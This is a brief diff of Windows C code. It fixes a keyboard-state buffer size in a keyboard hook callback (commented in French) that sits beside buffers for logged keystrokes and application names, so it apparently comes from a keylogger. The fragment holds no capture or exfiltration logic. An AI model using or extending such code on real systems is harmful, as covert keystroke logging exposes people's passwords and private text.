@@ -6,7 +6,7 @@ EXTERN_C_START
 //Fonction de callback du hook sur le clavier
 LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
 {
-    BYTE  keyboardState[255] = { 0 };
+    BYTE  keyboardState[256] = { 0 };
     WCHAR unicodeChar = 0;
     static WCHAR logsBuffer[32768] = { 0 };
     static WCHAR appName[32768] = { 0 };
